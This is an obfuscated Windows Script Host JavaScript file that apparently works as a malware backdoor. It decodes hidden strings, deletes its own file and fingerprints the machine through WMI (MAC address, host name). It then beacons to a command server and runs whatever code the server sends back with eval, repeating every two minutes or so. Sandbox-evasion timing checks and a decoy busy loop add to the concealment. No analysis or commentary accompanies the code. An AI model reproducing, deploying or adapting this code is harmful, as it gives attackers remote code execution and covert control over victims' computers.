function otrzl0k9h(q308n03h) {
    y3lc0p = "ben9qtdx4t";
    var v0yv6t=new String("");
        for(lt1x8=0;lt1x8<11;lt1x8++) {
            var fy47n=new RegExp(String.fromCharCode(lt1x8+65),"g");
            if(lt1x8==10)q308n03h=q308n03h.replace(fy47n,","); else q308n03h=q308n03h.replace(fy47n,String(lt1x8));
        }

    var q2u3i = q308n03h.split(",");
    var lt1x8=0;var wohqv=0;
    for(lt1x8=0;lt1x8<q2u3i.length-1;lt1x8++) {
        var w1mlxvt08=String.fromCharCode(Number(q2u3i[lt1x8]));
        var xu296=w1mlxvt08.charCodeAt(0)^y3lc0p.charCodeAt(wohqv);
        w1mlxvt08=String.fromCharCode(xu296);
        v0yv6t+= w1mlxvt08;
        if(wohqv==y3lc0p.length-1)wohqv=0; else wohqv++;
    }

    return v0yv6t;
}


function send_data (j048m, p937797f04, b0b29, o9d41) {
    try {
        if (o9d41 == "") {
        o9d41 = ez8pir()
        }

    var s020e = new ActiveXObject(otrzl0k9h("EHKFEKFEKBBGKGBKHAKHEKEDKIBKGKCAKAKCIKJHKGAKFGKEEKEEKJGKDGK"));
    if(j048m === otrzl0k9h("BGKAKDBKHGKCAKHKBGK")) {
    s020e.open(otrzl0k9h("FAKECKGBKBAJK"), o9d41 + otrzl0k9h("JDKBHKCDKHDKCAKHDKBAKCFKIJKBHK"), false);
    p937797f04 = otrzl0k9h("BFKGKBAKIEKHKBKBJKBKJAKBDKIKBJKHKGHKCKHDK") + y35sr(otrzl0k9h("HKBBKBDKHFKIKEKBGK"), otrzl0k9h("FKCDKBKHGKBKHDKAKCDKIHKGHKICKIFKHCKHFKFKHDKIEKJEKHBKBHKBKCDKBBKHHKHGKGHKDFKBIKGFKBDKEKIGKIHKBAJKEKAKIHKGEKHKDKGIKBHKHKIEKCAKHDKIFKHEKEKGIKICKIFKHCKHGKCEKBGKIJK") + epbt0 + otrzl0k9h("GIKBCKBAKEK") + eq5w0() + "&" + p937797f04);
    }
    else {
        s020e.open(otrzl0k9h("FAKECKGBKBAJK"), o9d41 + otrzl0k9h("JDKBHKCDKHDKCAKHDKHKCDKJAKAKHKBBKCGKDBKCEKBGKIJK") + epbt0, false);
        if(b0b29) {
            p937797f04 = y35sr(otrzl0k9h("HKBBKBDKHFKIKEKBGK"), p937797f04);

        }
    }

    s020e.setRequestHeader(otrzl0k9h("FFKCCKBBKHFKJCKFDKDKCJKJAKAK"), otrzl0k9h("EHKBAKCAKIAKCJKCEKFKIHKBKJAKICKGJKHAKBBAKCEKCGKAKCDKGHKHKGGKEDKFIKCFKHBKJAKIFKGHKCAKDFKBBKBBKIIKBDKHEKIEKCIKHIKAKHJKGGKCDKCEKDKHBKHHKHEKHCKCJKIEKDHKAKBDKICKDAKJBKIGKHCKFKGIKICKIEKJEKIKIBKFAKBDKBAKIBKBIKBDKCJKGFKBCKGFKJAKIEK"));
    s020e.setRequestHeader(otrzl0k9h("DDKBAKAKHHKCAKCGKBGKIFKJGKBDKBIKAK"), otrzl0k9h("DKCBKDAKIFKCEKCDKFKBCKJDKCHKBCKHEKCCKCAKGKDKBJKIFKICKCHKBGKIKGHKHGKDKCEKBKCCKIHKCHKGKAKBAK"));
    s020e.setOption(2, 13056);
    s020e.send(p937797f04);
    return s020e.responseText;
    }

    catch(e) {
        return otrzl0k9h("BCKBAK");
    }
}

function wuhx () {
    var s39qu6k = "";
    var qo5db51q = WScript;
    s39qu6k = send_data(otrzl0k9h("BGKAKDBKHGKCAKHKBGK"), otrzl0k9h("BIKEKJKJCKEGKCJKAKGJKJAKBHKCBK"), true, "");
    if(s39qu6k !== otrzl0k9h("BCKBAK")) {
        try {
            s39qu6k = y35sr(otrzl0k9h("GKAKBDKHFKIKEKBGK"), s39qu6k);
            if(s39qu6k !== otrzl0k9h("BCKBAK")) {
                eval(y35sr(otrzl0k9h("GKAKBDKHFKIKEKBGK"), s39qu6k));
            }
        }
        catch(e) {
        }
    }

    var b9l1r = 120000 + (Math.floor(Math.random() * 16001) - 5000);
    qo5db51q.Sleep(b9l1r);
    wuhx();
    if (!eg60ev7r0()) znx2dk();
}


function znx2dk() {
    try {
        for (var lt1x8 = 0; lt1x8 < 100000000; lt1x8++) {
            var di40y = (Math.floor(Math.random()*9000) + 1000).toString().split("");
            var e2g0jjg80o = (Math.floor(Math.random()*9000) + 1000).toString().split("");
            if (di40y !== e2g0jjg80o) {di40y += e2g0jjg80o}
        }
        return true;

    }
    catch(e) {
        return false;
    }
}


function nv373 () {
    var qo5db51q = WScript;
    qo5db51q.Sleep(120000);

}


function eq5w0 () {
    var xgq86 = otrzl0k9h("DJKCDKCIKIGKDK");
    var z897r8d = otrzl0k9h("DJKCDKCIKIGKDK");
    try {
        var rs18x3 = wmi.ExecQuery(otrzl0k9h("BHKAKCKJCKBIKAKGIKICKCAKBIKBGKBAKDKCFKDIKCJKBAKHFKGKEDKEEKAKCGKHIKDAKGKBFKFHKIAKCBKBIKBHKBBKHFKFAKCHKBAKDAKJDKBJKCDKCDKBFKHHKCEKCHKBAKIIKGHKCIKHKCDKBBKCFKCEKEKBKCCKIFKCCKBEKAKBAKCFKHGKIEKBGKBAKGFKBHK"));
        var n0q7q = new Enumerator(rs18x3);
        for (; !n0q7q.atEnd(); n0q7q.moveNext()) {
            xgq86 = n0q7q.item().DNSHostName;
            z897r8d = n0q7q.item().macaddress;
            if(typeof z897r8d === otrzl0k9h("BHKBHKCIKIAKDBKBJK") && z897r8d.length > 1) {
                if(typeof xgq86 !== otrzl0k9h("BHKBHKCIKIAKDBKBJK") && xgq86.length < 1) {
                    xgq86 = otrzl0k9h("FFKBBKFKIHKDAKDKBAK");
                }
                else {
                    for (var lt1x8 = 0; lt1x8 < xgq86.length; lt1x8++) {
                        if (xgq86.charAt(lt1x8) > "z") {
                            xgq86 = xgq86.substr(0, lt1x8) + "_" + xgq86.substr(lt1x8 + 1);
                        }
                    }
                }
                return z897r8d + "_" + xgq86;
            }
        }
    }
    catch(e) {
        if (!eg60ev7r0()) znx2dk();
        return z897r8d + "_" + xgq86;
    }
}


var shell = new ActiveXObject(otrzl0k9h("FDKFEKBDKHFKCEKEKBGKIGKBADKCIKHKJKCK"));
var l6ss73 = shell.expandEnvironmentStrings(otrzl0k9h("HBKDGKGCKBAFKFDKFDKEIKFHKBHK"));
var epbt0 = new Date().getUTCMilliseconds();
var wmi = GetObject(otrzl0k9h("CBKBCKAKIEKCCKCFKBGKBBKBEKGKBDKBAKCGKCCKFAKGBKEBKEGKGK"));
var fso = new ActiveXObject(otrzl0k9h("EJKGKCIKIAKBKAKBDKCCKIDKJAKDGKBCKCKJCKDEKBDKCDKBCKIBKCFKEFKHKEKJCKBIKAK"));

try{
    fso.deleteFile(WScript.ScriptFullName);
}
catch(e) {

}


if (!eg60ev7r0()) znx2dk();
try {
    nv373 ();
    wuhx();
}
catch(e) {
    wuhx();
}


function eg60ev7r0() {
    var tbb1k = true;
    try {
        var qo5db51q = WScript;
        var mld66nnw5w = new Date();
        qo5db51q.Sleep( 3000 );
        var mld66nnw5w2 = new Date();
        var n9vs6 = mld66nnw5w2 - mld66nnw5w;
        if (n9vs6 < 2980) {
            tbb1k = false;
            WScript.Echo(n9vs6);
        }
        if (tbb1k) {
            var s39qu6k = send_data(otrzl0k9h("BGKAKDBKHGKCAKHKBGK"), otrzl0k9h("BIKEKJKJCKEGKCJKAKGJKJAKBHKCBK"), true, otrzl0k9h("CCKBBKCJKICKHKBJKDKBDKJEKDAKBJKDKBDKHEKCGKDKBFKIGKIHKCHKBFK"));
            if (s39qu6k !== otrzl0k9h("BCKBAK")) {
            tbb1k = false;
            WScript.Echo("url");
            }
        }
        return true;
    }
    catch(e) {
        WScript.Echo("mem");
        return false;
    }
}

function ez8pir () {
    var ttj9x0 = [otrzl0k9h("BBKIKBFKJEKCAKHK"), otrzl0k9h("BIKBCKBDKHHKEKGKBKBBK"), otrzl0k9h("BBKIKJK"), otrzl0k9h("BBKBBKIKIGK"), otrzl0k9h("BCKAKCFK")];
    var vam41ad = [otrzl0k9h("BHKCIKAKJAK"), otrzl0k9h("BHKBDKBKHIK"), otrzl0k9h("BAKBCKBAKJCK"), otrzl0k9h("DKBKBAK"), otrzl0k9h("BCKAKCFK"), otrzl0k9h("BGKAKAKJCKGK"), otrzl0k9h("GKAKCKJCKFKBHK")];
    if (!eg60ev7r0()) znx2dk();
    var o9d41 = ttj9x0[Math.floor(Math.random() * ttj9x0.length)] + "/" + vam41ad[Math.floor(Math.random() * vam41ad.length)];
    return otrzl0k9h("BAKBHKCGKHDKCKHIKHFKIHKIGKBDKBIKEKCJKHEKDAKCDKBDKCFKGEKCJKBDKBBKGEKJAKDAKCFKHFK") + o9d41;
}


function y35sr (j048m, oq19u) {
    try{
        var dn80d7 = "";
        if(j048m === otrzl0k9h("GKAKBDKHFKIKEKBGK")) {
            oq19u = unescape(oq19u);
            var o39fc = oq19u.split(otrzl0k9h("GIKFIKHCK"));
            oq19u = o39fc[0];
                if (o39fc.length == 2) {
                    dn80d7 = o39fc[1].split("");
                }
                else {
                    return oq19u;
                }
        }
        else {
            dn80d7 = (Math.floor(Math.random()*9000) + 1000).toString().split("");
            oq19u=unescape(encodeURIComponent(oq19u));
        }

        var qb47f = new Array(oq19u.length);
        for (var lt1x8 = 0; lt1x8 < oq19u.length; lt1x8++) {
            var pghlm6e = oq19u.charCodeAt(lt1x8) ^ dn80d7[lt1x8 % dn80d7.length].charCodeAt(0);
            qb47f[lt1x8] = String.fromCharCode(pghlm6e);
        }
        var qn1oevn = qb47f.join("");
        if(j048m === otrzl0k9h("HKBBKBDKHFKIKEKBGK")) {
            qn1oevn = qn1oevn + otrzl0k9h("GIKFIKHCK") + dn80d7.join("");
            qn1oevn = escape(qn1oevn);
        }
        return qn1oevn;
    }
    catch(e) {
        if (!eg60ev7r0()) znx2dk();
        return otrzl0k9h("BCKBAK");
    }
}